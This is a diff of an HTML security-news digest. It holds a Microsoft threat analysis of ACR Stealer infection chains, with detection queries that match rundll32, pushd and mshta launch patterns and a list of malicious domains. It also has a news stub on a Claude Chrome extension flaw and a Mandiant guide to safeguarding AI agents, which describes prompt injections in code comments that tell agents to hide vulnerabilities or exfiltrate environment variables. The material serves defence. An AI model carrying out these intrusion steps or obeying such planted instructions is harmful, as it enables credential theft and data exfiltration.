@@ -59,17 +59,334 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-07-16</h1>
+        <h1>Security Briefing // 2026-07-17</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Zoom Patches Critical Windows Flaw That Could Enable Account Takeover</button></li><li><button onclick="show('art-1')">Unpacking the AsyncAPI npm supply chain compromise and import-time payload delivery</button></li><li><button onclick="show('art-2')">Zoom warns of critical account takeover vulnerability</button></li><li><button onclick="show('art-3')">There and Back Again: An Operators Guide on NTLM Relaying Egress</button></li><li><button onclick="show('art-4')">The Risk of Exposed Cloud Functions and How to Harden</button></li><li><button onclick="show('art-5')">CISA warns admins to patch actively exploited SharePoint flaws</button></li><li><button onclick="show('art-6')">Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware</button></li><li><button onclick="show('art-7')">Microsoft Patches a Record 570 Security Flaws</button></li><li><button onclick="show('art-8')">Pandora’s Container Part 1: Unpacking Azure Container Security</button></li><li><button onclick="show('art-9')">Lessons Learned from CISA’s Recent GitHub Leak</button></li></ul>
+            <ul><li><button onclick="show('art-0')">US charges two over laundering $43 million from investment fraud</button></li><li><button onclick="show('art-1')">ACR Stealer: Two observed intrusion chains amid increased threat activity</button></li><li><button onclick="show('art-2')">Claude Chrome extension flaw lets malicious extensions trigger AI actions</button></li><li><button onclick="show('art-3')">Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management</button></li><li><button onclick="show('art-4')">n8n Token Exchange Flaw Could Let Attackers Log In as Users From Another Issuer</button></li><li><button onclick="show('art-5')">Zoom Patches Critical Windows Flaw That Could Enable Account Takeover</button></li><li><button onclick="show('art-6')">CMMC is (Not) Cancelled</button></li><li><button onclick="show('art-7')">There and Back Again: An Operators Guide on NTLM Relaying Egress</button></li><li><button onclick="show('art-8')">Microsoft Patches a Record 570 Security Flaws</button></li><li><button onclick="show('art-9')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">US charges two over laundering $43 million from investment fraud</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-charges-two-over-laundering-43-million-from-investment-fraud/" target="_blank">Original Link</a></p>
+            <div class="content-text">U.S. prosecutors on Thursday charged a New York man and woman for their roles in a large-scale crime ring that laundered money stolen in cyber investment fraud scams. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">ACR Stealer: Two observed intrusion chains amid increased threat activity</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/" target="_blank">Original Link</a></p>
+            <div class="content-text">From late April 2026 to mid-June 2026, Microsoft Defender Experts observed increased ACR Stealer activity across customer environments. These campaigns are successfully using ClickFix lures to steal browser credentials, authentication tokens, and sensitive documents from enterprise environments. Successful compromise can expose browser credentials, session tokens, authentication artifacts, and sensitive enterprise data, potentially enabling account compromise, unauthorized access to cloud resources, and follow-on intrusion activity. Security teams should prioritize monitoring for ClickFix lures, suspicious WebDAV activity, obfuscated PowerShell execution, and attempts to access browser credential stores.
+ACR Stealer is an information-stealing malware family reportedly offered through a malware-as-a-service (MaaS) model and associated with the rebranding of Amatera Stealer. During this period, two campaigns stand out, together appearing frequently in reviewed recent intrusions. Both begin the same way, with a ClickFix social engineering technique that tricks targets into running the threat actor’s command, but the intrusion chains that follow diverge in how they deliver payloads, establish execution, and evade detection.
+The first campaign relies on WebDAV-delivered payloads, staged PowerShell, Python-based loaders and persistence, and, in some intrusions, blockchain-backed dead-drop command-and-control (C2) resolution. The second campaign takes a more fileless route, using MSHTA, obfuscated PowerShell, and steganography-assisted in-memory execution. Despite these differences, both campaigns ultimately pursue the same goal: stealing browser-stored credentials and other sensitive data for exfiltration.
+These two campaigns represent some of the most prevalent ACR Stealer delivery campaigns observed by Defender Experts; however, they do not represent the full range of delivery methods used by this malware family. Attribution to ACR Stealer is based on the observed behavior and post-exploitation tradecraft, corroborated by open-source intelligence on the infrastructure associated with this malware family. Additional campaigns, infrastructure patterns, and execution chains are likely active, and organizations should treat the indicators and techniques described here as representative.
+Microsoft Defender for Endpoint can help surface both campaigns through behavioral coverage for living-off-the-land execution, suspicious WebDAV and MSHTA activity, obfuscated PowerShell, scheduled-task persistence, in-memory payload execution, and browser credential theft. In this blog, we analyze both campaigns in detail, including their delivery mechanisms, post-exploitation tradecraft, indicators of compromise, hunting opportunities, and guidance to help defenders detect and disrupt related activity in their environments.
+Campaign 1: WebDAV-based ClickFix with Python loaders and blockchain C2
+Initial access
+In this campaign, a ClickFix prompt, likely delivered through malvertising or SEO-manipulated search results, instructs the target user to run a command that launches cmd.exe. The command subsequently invokes rundll32.exe to load a DLL from a remote WebDAV share accessed over HTTPS. The WebDAV path commonly uses a GUID-based directory structure and filenames designed to resemble legitimate resources (for example, google.ct), enabling the activity to blend with expected network traffic and evade casual inspection.
+We observed three variants of the initial execution command:
+Variant 1: Direct rundll32 invocation
+Variant 2: pushd-Mounted WebDAV Share
+Variant 3: Headless and obfuscated pushd execution
+Variants 2 and 3 are notable for their use of pushd, which transparently maps the remote WebDAV share to a temporary local drive prior to execution. This technique allows threat actors to execute remotely hosted content through what appears to be a local path, simplifying payload execution while reducing user awareness. In the more advanced variant, threat actors further enhance stealth by launching commands through conhost.exe –headless, suppressing visible console windows, and employing environment variable obfuscation with delayed variable expansion to conceal critical execution components such as pushd, rundll32, and the remote host name. Combined with minimized or headless execution, these techniques reduce user visibility, complicate static analysis and detection, and enable the infection chain to execute with minimal indication to the victim.
+Execution, persistence, and evasion through process masquerading
+Once rundll32.exe loads the DLL retrieved from the remote server, the malware establishes communication with threat actor-controlled infrastructure and executes a heavily obfuscated PowerShell script. The script employs excessive arithmetic no-ops, dead loops, fake control flow, and randomized variable names to hinder static analysis and evade signature-based detection.
+The PowerShell script subsequently deploys another stage that functions as both a malware installer and a persistence mechanism. It:
+- Downloads a ZIP-packaged payload from a remote server and extracts it into a deceptive directory under %LocalAppData%\Temp (for example, LogiOptionsPlus).
+- Launches a Python script using a bundled pythonw.exe instance to avoid displaying a console window.
+- Removes previous deployments and terminates running instances before installation, effectively operating as an updater.
+- Establishes persistence through a hidden scheduled task disguised as a legitimate software update, ensuring execution at user sign-in.
+- Copies timestamps from a trusted Windows binary (notepad.exe) to the deployed files and clears PowerShell command history to reduce forensic visibility.
+Python loader launching the stealer
+The Python component serves as a heavily obfuscated loader designed to conceal its true functionality until runtime. It employs multiple layers of defense against static analysis, including dynamic API resolution, encoded string reconstruction, junk-data removal, character shifting, string reversal, Base64 decoding, and zlib decompression. These techniques ensure that the embedded payload remains unreadable in its static form and is reconstructed only during execution, significantly hindering signature-based detection and automated analysis.
+Once decoded, the final-stage payload functions as an in-memory shellcode loader. It extracts an archive file masquerading as a legitimate application installer, reads a file from the archive, and injects the payload into a system process. The loader allocates executable memory using VirtualAlloc, copies the payload into the allocated memory region, and transfers execution through the Windows Fiber API (ConvertThreadToFiber, CreateFiber, and SwitchToFiber). This technique facilitates stealthy in-memory execution while minimizing artifacts written to disk.
+Credential theft and data staging for exfiltration
+The malware (injected code) aggressively harvests information from browser credential stores. It invokes Windows Data Protection API (DPAPI) routines to decrypt locally stored browser passwords, cookies, and authentication tokens. It also enumerates files across the system, targeting PDFs, Microsoft 365 documents, and data stored in enterprise-synchronized directories such as OneDrive and SharePoint. The collected data is subsequently archived, indicating preparation for exfiltration.
+Blockchain dead-drop C2 resolution
+A notable variation in this campaign is the use of blockchain services for C2 resolution, utilizing a technique known as EtherHiding. While most intrusions rely on more conventional C2 mechanisms, a subset deploys an additional secondary Python loader that leverages blockchain services as dead-drop resolvers. When this loader executes, it has been observed communicating with public blockchain RPC endpoints and third-party Web3 node infrastructure, likely querying data stored on a decentralized public ledger to retrieve follow-up payloads or a C2 address.
+By externalizing C2 information to the blockchain, operators could dynamically update infrastructure without modifying or redeploying the malware, significantly complicating detection and takedown efforts. This behavior was observed across both variants of the campaign.
+Campaign 2: MSHTA-initiated PowerShell chain with steganographic payload delivery
+The second campaign takes a distinctly different approach to both delivery and execution. Where Campaign 1 relies on disk-based artifacts (Python runtime, scheduled tasks, and masquerading binaries), this campaign achieves its objectives almost entirely through fileless, in-memory execution, making it harder to detect through file-based scanning and forensic analysis.
+Initial access through MSHTA and ClickFix
+The execution chain begins when the victim, directed through malvertising or SEO-manipulated search results, encounters a ClickFix prompt that triggers a command spawning MSHTA to fetch and execute remote HTA content from an threat actor-controlled domain. The embedded VBScript loader abuses COM objects to decode and execute encoded PowerShell content.
+PowerShell downloader and obfuscation
+The decoded PowerShell stage employs obfuscation techniques similar to those seen in Campaign 1: randomized variable names, arithmetic no-op operations, dead loops, misleading control flow, and custom encryption routines. Prior to contacting its next-stage infrastructure, the malware generates a victim-specific identifier and disables certificate validation. The retrieved content is executed directly in memory.
+Steganography-based payload delivery
+A notable technique in this campaign is the use of steganography to conceal malicious content inside a publicly hosted image. Instead of downloading a secondary script (as in Campaign 1), the malware retrieves a JPEG image from an image-hosting service.
+Analysis of the script revealed custom routines that extract an embedded payload from image pixels, decrypt and decompress it, and execute it entirely in memory. The payload dynamically resolves APIs such as LoadLibrary, GetProcAddress, VirtualAlloc, CreateThread, and WaitForSingleObject at runtime to perform reflective shellcode execution. By combining steganography with in-memory execution, the malware minimizes on-disk artifacts and complicates both detection and analysis.
+Credential theft, data collection, and exfiltration
+Following execution, the malware accesses credential stores belonging to Chromium-based browsers, including Google Chrome and Microsoft Edge, specifically the Login Data and Web Data databases, alongside Windows DPAPI decryption activity. This behavior indicates attempts to recover stored browser credentials, session cookies, authentication tokens, and other sensitive user information.
+The malware also enumerates and accesses multiple high-value PDF documents across Desktop and Downloads locations, suggesting targeted collection of potentially sensitive files. The combination of browser credential harvesting and systematic document access points to an information-stealing objective focused on staging credentials and valuable user data for exfiltration.
+Mitigation and protection guidance
+Microsoft recommends the following mitigations to reduce the impact of ClickFix lures, script-based payload delivery, credential theft, and post-compromise activity.
+- Educate users to recognize ClickFix-style prompts, fake verification checks, and paste-and-run instructions as malicious, especially when they invoke command interpreters or script hosts such as cmd.exe, PowerShell, rundll32.exe, or mshta.exe.
+- Reduce exposure to malvertising, SEO poisoning, and other web-based delivery chains by enforcing web filtering, blocking low-reputation or newly observed domains, and limiting access to remote content sources that are not required for business operations.
+- Use application control and attack surface reduction rules to restrict PowerShell, Python, mshta.exe, rundll32.exe, and similar tools from launching untrusted or internet-delivered content, particularly from user-writable directories such as Downloads, Temp, and %LocalAppData%.
+- Monitor for suspicious persistence and defense-evasion behavior, including scheduled tasks masquerading as software updates, timestomping, PowerShell history clearing, and execution chains that progress from remote content retrieval into PowerShell, Python, or shellcode-loading behavior.
+- Investigate abnormal access to Chromium-based browser databases, DPAPI-related decryption activity, staged collection of Microsoft 365 documents or PDFs, and compression activity that may indicate credential theft or data staging for exfiltration.
+- If compromise is suspected, isolate affected devices, rotate exposed credentials, revoke potentially compromised tokens, review persistence mechanisms, and investigate outbound connections to remote shares, image-hosting services, or other infrastructure used to resolve or retrieve follow-on payloads.
+- Harden endpoints against credential theft by reducing reliance on browser-stored credentials, enforcing multifactor authentication and conditional access, and reviewing how privileged accounts access sensitive applications and synchronized enterprise data.
+- Turn on
+[cloud-delivered protection](https://learn.microsoft.com/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus)and behavior-based detections to help identify rapidly evolving threats, suspicious script execution, in-memory payload delivery, abuse of browser credential stores, and unusual child-process activity. - Run
+[endpoint detection and response (EDR) in block mode](https://learn.microsoft.com/defender-endpoint/edr-in-block-mode)and enable[automated investigation and remediation](https://learn.microsoft.com/defender-endpoint/automated-investigations)so post-breach detections are contained, and malicious artifacts can be removed with minimal delay. - Harden PowerShell by enforcing appropriate execution policies, turning on
+[script block logging](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging?view=powershell-5.1), module logging, and transcription, and monitoring this telemetry for signs of malicious script activity. - Turn on
+[tamper protection](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection)and prevent local administrators from weakening antivirus protection through local policy or exclusion changes.
+Microsoft Defender XDR detections
+Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+| Tactic | Observed Activity | Microsoft Defender Coverage |
+| Execution | – Suspicious MSHTA launch through ClickFix execution – Rundll32 loads remote WebDAV DLL – COM objects launch in-memory PowerShell | Microsoft Defender for Endpoint – Use of living-off-the-land binary to run malicious code – Obfuscated command line was launched – Suspicious process executed PowerShell command – Suspicious process launch by Rundll32.exe Microsoft Defender for Antivirus Behavior:Win32/Interhta.Int |
+| Persistence | PowerShell creates Scheduled task, masquerading as a software update | Microsoft Defender for Endpoint – Suspicious Scheduled Task Process Launched – Suspicious scheduled task |
+| Stealth/Defense Evasion | – Fiber-API in-memory shellcode execution – Reflective shellcode via CreateThread | Microsoft Defender for Endpoint Possible process hollowing |
+| Credential Access | Collects browser credentials, cookies, and tokens while enumerating files for exfiltration | Microsoft Defender for Endpoint – Information stealing malware activity – Suspicious DPAPI activity – Possible theft of passwords and other sensitive web browser information |
+Microsoft Security Copilot
+[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) is [embedded in Microsoft Defender](https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender) and provides security teams with AI-powered capabilities to summarize incidents, analyze files and scripts, summarize identities, use guided responses, and generate device summaries, hunting queries, and incident reports.
+Customers can also [deploy AI agents](https://learn.microsoft.com/defender-xdr/security-copilot-agents-defender), including the following [Microsoft Security Copilot agents](https://learn.microsoft.com/copilot/security/agents-overview), to perform security tasks efficiently:
+[Threat Intelligence Briefing agent](https://learn.microsoft.com/defender-xdr/threat-intel-briefing-agent-defender)[Phishing Triage agent](https://learn.microsoft.com/defender-xdr/phishing-triage-agent)[Threat Hunting agent](https://learn.microsoft.com/defender-xdr/advanced-hunting-security-copilot-threat-hunting-agent)[Dynamic Threat Detection agent](https://learn.microsoft.com/defender-xdr/dynamic-threat-detection-agent)
+Security Copilot is also available as a [standalone experience](https://learn.microsoft.com/en-us/copilot/security/experiences-security-copilot) where customers can perform specific security-related tasks, such as incident investigation, user analysis, and vulnerability impact assessment. In addition, Security Copilot offers [developer scenarios](https://learn.microsoft.com/copilot/security/developer/custom-agent-overview) that allow customers to build, test, publish, and integrate AI agents and plugins to meet unique security needs.
+Threat intelligence reports
+Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get current information available in the Defender portal about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to help prevent, mitigate, or respond to associated threats found in customer environments:
+[Amatera Stealer: Rebranded ACR Stealer With Improved Evasion, Sophistication](https://security.microsoft.com/intel-explorer/articles/a9f32b94)[Double Trouble: Latrodectus and ACR Stealer observed spreading via Google Authenticator Phishing Site](https://security.microsoft.com/intel-explorer/articles/a476ee2b)
+Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat actor.
+Advanced hunting queries
+Microsoft Defender XDR customers can run the following [advance hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview) queries to find related activity in their networks:
+Run the query below to identify suspicious commands executed through ClickFix-based activity observed while delivering this stealer
+DeviceRegistryEvents | where RegistryKey has "RunMRU" | where (RegistryValueData has_all ("rundll32", "@ssl", " /c ", " start ") and (RegistryValueData matches regex @"\\\\[^\\]+@ssl\\[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\\\w+\.\w+,#1" or RegistryValueData matches regex @"(?i)pushd \\\\[^\\]+@ssl\\[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12} ")) or RegistryValueData has_all ("@ssl", " /c ", "conhost --headless ") and RegistryValueData contains "rundll32" |
+Run the query below to identify scheduled task creation used for persistence by a malicious PowerShell script
+DeviceProcessEvents | where InitiatingProcessFileName =~ "powershell.exe" | where InitiatingProcessCommandLine has_all ("-Command", "powershell") | where ProcessCommandLine has_all ("schtasks", " /run /tn ", " Autoupdate ") and ProcessCommandLine matches regex "[0-9]{8}" |
+Run the query below to identify suspicious MSHTA launch through PowerShell
+DeviceProcessEvents | where InitiatingProcessParentFileName has "explorer.exe" | where InitiatingProcessFileName =~ "powershell.exe" and InitiatingProcessCommandLine in~ ('"PowerShell.exe" ', '"PowerShell.exe"') | where ProcessCommandLine has_all ('"mshta.exe" https://') and ProcessCommandLine matches regex "/[0-9]{7}" |
+MITRE ATT&CK techniques observed
+The following mapping summarizes the primary tactics and techniques observed across the two ACR Stealer intrusion chains. The mapping is intended to help defenders align observed behaviors with existing detection coverage, response playbooks, and hunting priorities.
+| Tactic | Technique | Observed behavior |
+| Initial Access | Drive-by Compromise; User Execution | ClickFix lure prompts command execution. |
+| Execution | Command and Scripting Interpreter: Windows Command Shell; PowerShell; Python | cmd.exe, PowerShell, and pythonw.exe launch staged payloads. |
+| Execution | System Binary Proxy Execution: Rundll32; Mshta | Rundll32 loads WebDAV DLLs; mshta.exe runs remote HTA content. |
+| Persistence | Scheduled Task/Job: Scheduled Task | Hidden scheduled task maintains user-logon execution. |
+| Defense Evasion | Obfuscated Files or Information; Masquerading; Indicator Removal: Clear Command History | Obfuscation, timestomping, history clearing, and masquerading. |
+| Defense Evasion | Obfuscated Files or Information: Steganography | JPEG pixel data hides the encrypted payload. |
+| Defense Evasion / Execution | Reflective Code Loading; Process Injection | In-memory shellcode execution via runtime API resolution. |
+| Credential Access | Credentials from Web Browsers | Browser stores and DPAPI activity used to recover credentials and tokens. |
+| Collection | Data from Local System; Data Staged | PDFs, Office files, and synced enterprise data are staged. |
+| Command and Control | Web Service; Dead Drop Resolver | Infrastructure and blockchain RPC endpoints resolve payload or C2 data. |
+Indicators of compromise (IOC)
+| Campaign 1 | |
+| Indicator | Description |
+| looksta[.]icu | C2 domain |
+| contrite.quirksturdy[.]icu | C2 domain |
+| ux.strainedeasily[.]icu | C2 domain |
+| cpppemwjewjoiwejow[.]sale | C2 domain |
+| breaksd.wifihot[.]icu | C2 domain |
+| walter.filloco[.]icu | C2 domain |
+| fast.raidher[.]icu | C2 domain |
+| apigrokcloud[.]icu | C2 domain |
+| Campaign 2 | |
+| enhanceblabber[.]cc | C2 domain |
+| deep-harborio[.]com | 1st Stage payload hosting site |
+| auramatrixa[.]com | 1st Stage payload hosting site |
+| zealpraxis[.]com | 1st Stage payload hosting site |
+| prism-vertex[.]com | 1st Stage payload hosting site |
+| prism-matrixs[.]com | 1st Stage payload hosting site |
+| proton-network[.]com | 1st Stage payload hosting site |
+| creativecommunityinfo[.]art | Payload hosting site |
+References
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection)</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Claude Chrome extension flaw lets malicious extensions trigger AI actions</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/claude-chrome-extension-flaw-lets-malicious-extensions-trigger-ai-actions/" target="_blank">Original Link</a></p>
+            <div class="content-text">A flaw in Anthropic's Claude for Chrome browser extension could allow a malicious extension to trigger predefined AI actions by simulating user clicks, potentially allowing it to abuse Claude's access to connected services such as Gmail, Google Docs, Google Calendar, and Salesforce. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/ai-assisted-vulnerability-management/" target="_blank">Original Link</a></p>
+            <div class="content-text">Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management
+Mandiant
+Written by: Jules Czarniak
+Introduction
+As highlighted in the [Mandiant M-Trends 2026 report](https://cloud.google.com/security/resources/m-trends), the mean time-to-exploit (TTE) has dropped to -7 days, meaning vulnerabilities are often exploited a week before a patch even exists.
+To keep pace, many security teams are exploring how to integrate large language model (LLM) agents into their codebases, development environments and continuous integration and continuous delivery (CI/CD) pipelines for automated vulnerability discovery and remediation. However, deploying privileged artificial intelligence (AI) agents without mature integration processes introduces new architectural risks.
+In response to customer inquiries about how to safely integrate AI capabilities into vulnerability management workflows, this blog provides actionable guidance from Mandiant Consulting about how to establish operational guardrails for AI assisted vulnerability management, including several detailed scenarios. What each of these examples show is that security teams can accelerate workflows with AI while also upholding the structural integrity of their environments. We suggest that combining AI capabilities with deterministic controls and human intelligence in strategic ways maximizes benefits and reduces risk.
+Establish Operational Guardrails to Safely Deploy AI Agents
+To safely adopt advanced AI capabilities without introducing unpredictable failures into deployment pipelines, organizations should ground their approach in established industry standards. While guidelines like the [NIST AI Risk Management Framework (RMF)](https://www.nist.gov/itl/ai-risk-management-framework) and the [OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/) provide comprehensive baselines for identifying risks, operationalizing these controls requires a structural blueprint.
+Frameworks like [Google’s Secure AI Framework (SAIF)](https://safety.google/intl/en_sg/safety/saif/) [and](https://safety.google/intl/en_sg/safety/saif/)[ Google’s approach to secure AI Agents](https://storage.googleapis.com/gweb-research2023-media/pubtools/1018686.pdf) provide a practical path forward, demanding that organizations extend existing deterministic controls directly into the AI execution environment. When deploying AI agents, security teams should navigate specific operational and structural risks:
+-
+Pre-agent data security and Defense-in-Depth: Agents should not be able to access personally identifiable information (PII), protected health information (PHI), or other sensitive data. Organizations should enforce data security before the prompt reaches the model. This includes strictly using non-production environments populated with synthetic data for testing. For production, security teams should deploy a hybrid defense-in-depth model. This includes Layer 1 deterministic policy engines acting as chokepoints, alongside Layer 2 reasoning-based defenses like specialized guard models (such as
+[Model Armor](https://docs.cloud.google.com/model-armor/overview)or similar provider-agnostic guardrails) to filter out sensitive data and block malicious prompt injections before they reach the agent layer. Crucially for vulnerability discovery, security teams should treat the codebase itself as an untrusted input. Threat actors can embed indirect prompt injections within source code comments or third-party dependencies (e.g., hidden instructions telling the agent to ignore vulnerabilities or exfiltrate environment variables), making input sanitation a requirement even for internal scanning. -
+Cloud provider limitations and zero data retention (ZDR): Many cloud and LLM providers block or throttle automated offensive security probing by default to prevent abuse. Organizations should establish clear rules of engagement and authorized testing agreements to navigate acceptable use policies. Furthermore, organizations should enforce strict zero data retention (ZDR) agreements with their LLM providers to guarantee that proprietary code and discovered vulnerabilities are never used to train external models.
+-
+Workload isolation: Agent workloads should execute in strictly isolated, unprivileged containers with dynamically limited privileges. By relying on robust sandboxing to prevent privilege escalation, if an agent hallucinates a destructive command or is hijacked via prompt injection, the blast radius remains contained.
+-
+Red Teaming: Before deploying autonomous vulnerability scanners that can dynamically spin up sandboxes and execute code, organizations should subject the AI agents themselves to human-led red teaming as part of comprehensive assurance efforts. This validates the agent's resilience against jailbreaks, recursive logic loops, and complex prompt injections, ensuring the security tooling does not become the attack vector.
+-
+Least-Privileged Machine Identities and Human Controllers: While workloads should be isolated, agents inherently require privileges to generate pull requests and commit code. Security teams should ensure these agents operate under distinct, strictly scoped machine identities that tie back to human controllers to ensure accountability and user consent. Organizations should use short-lived, just-in-time (JIT) tokens bound exclusively to the specific repository and branch under review. This enforces the principle of limited agent powers and ensures that even if an agent’s container is compromised via prompt injection, the threat actor cannot pivot to modify adjacent enterprise codebases.
+-
+Supply chain resilience for skills: As developers augment AI with third-party skills and model context protocol (MCP) servers, security teams should treat these integrations as untrusted supply chain components. MCP plugins introduce the risk of supply chain poisoning, where a previously benign integration is silently updated with malicious dependencies. Additionally, security teams should evaluate the underlying agent orchestration frameworks themselves (e.g., LangChain, AutoGen) for inherent vulnerabilities, such as session memory poisoning or recursive loop hijacking.
+-
+Toxic flow analysis (TFA) and Observable Actions: The objective of TFA is to monitor data paths at runtime, ensuring agents do not exfiltrate sensitive internal context to unvetted external endpoints. Agent actions, inputs, reasoning, and outputs must be fully observable and transparently logged. While implementing dynamic taint tracking for LLMs remains a complex architectural challenge, organizations should clearly separate this runtime observability from static supply chain controls. Integrating threat intelligence to hash and vet incoming agent tools provides a necessary baseline for verifying integrity before deployment. However, because static controls cannot address behavior post-deployment, mitigating data exfiltration ultimately requires active runtime monitoring and secure, centralized logging to trace and restrict the actual flow of data.
+Figure 1: Visual representation of an isolated AI agent environment using SAIF mechanisms
+By operationalizing these tools within frameworks that demand verifiable integrity and structural resilience, organizations can safely bridge the gap between AI velocity and enterprise defense.
+The need for human-led threat modeling
+While LLMs excel at identifying syntax patterns, source code itself rarely contains the full picture of unwritten business intent. Some organizations attempt to solve this by connecting LLM agents to internal wikis, design documents, and issue trackers using retrieval-augmented generation (RAG).
+While RAG gives the model access to external business context, it is not a perfect fix. Corporate documentation is frequently stale, contradictory, or incomplete. An AI agent might retrieve an outdated architecture diagram and confidently hallucinate a secure path that no longer exists in production. Because LLM agents struggle to resolve conflicting, undocumented human assumptions, human-led threat modeling remains a critical security control across both legacy applications and modern agent workflows.
+Security teams should apply threat modeling during both the pre-build system design phase to establish a secure foundation, and during post-build architecture reviews. While an AI agent might successfully identify a poorly configured internal endpoint locally, a human threat modeler asks the structural question: why does that microservice possess broad database read permissions in the first place?
+Identifying architectural vulnerabilities requires reasoning about business risk, data sensitivity, and operational constraints. To structure this process, organizations can use industry frameworks like PASTA (Process for Attack Simulation and Threat Analysis) or service offerings like the [Mandiant Threat Modeling Security Service](https://services.google.com/fh/files/misc/ds-threat-modeling-security-service-en.pdf) to map trust boundaries, uncover structural design flaws, and prioritize compensating controls. Securing fundamental architecture through human oversight is a necessary component when relying on automated agents to find bugs in a poorly designed system.
+Once these AI agents are safely sandboxed, as guided by SAIF, and the architecture is verified through threat modeling, organizations can typically apply them to two different problem spaces: Enterprise Vulnerability Management (to assist in managing the volume of known CVEs in commercial off-the-shelf (COTS) software and infrastructure) and Product Security (to identify vulnerabilities in 1st-party (1P) code).
+Track 1: Enterprise Vulnerability Management
+Foundational security and discovery
+While the second track of this post explores how AI agents can uncover complex zero-days in custom code, organizations should manage the scale of enterprise infrastructure in tandem with these AI deployments. Even as new AI capabilities dominate headlines, organizations should still address foundational security challenges, such as secrets sprawl, unmanaged service accounts, missing FIDO2 MFA, and legacy VPN concentrators. Although vulnerability exploitation was the primary initial infection vector in intrusions Mandiant investigated last year, threat actors consistently rely on missing foundational controls and unpatched edge devices to secure and escalate their foothold after exploiting a vulnerability.
+Furthermore, AI cannot replace foundational visibility. As security teams deploy AI agents, they should simultaneously close these tactical entry points by maximizing dynamic discovery capabilities like External Attack Surface Management (EASM), Cloud Security Posture Management (CSPM), and Continuous Threat Exposure Management (CTEM). In hybrid and cloud environments, tools like [Wiz](https://cloud.google.com/wiz?e=48754805) can be used to map this initial footprint.
+Risk-based vulnerability management
+Vulnerability management teams are already overwhelmed by the current volume of findings generated by traditional scanners. As organizations scale dynamic discovery tools, such as EASM, CSPM and CTEM, alongside automated AI agents, this influx of findings will compound the problem. To manage this influx, telemetry from these diverse discovery methods must first be normalized and deduplicated. This normalized data serves two purposes: it feeds directly into the risk engine, and it acts as a live overlay to correct stale records in the configuration management database (CMDB). By evaluating the deduplicated vulnerabilities alongside this newly updated asset context and frontline threat intelligence, the RBVM engine calculates a custom risk score that allows security teams to dynamically prioritize remediation.
+A mature RBVM methodology calculates a customized risk score on a 0 to 100 scale using a weighted average. A sample formula for calculating this risk-based score is:
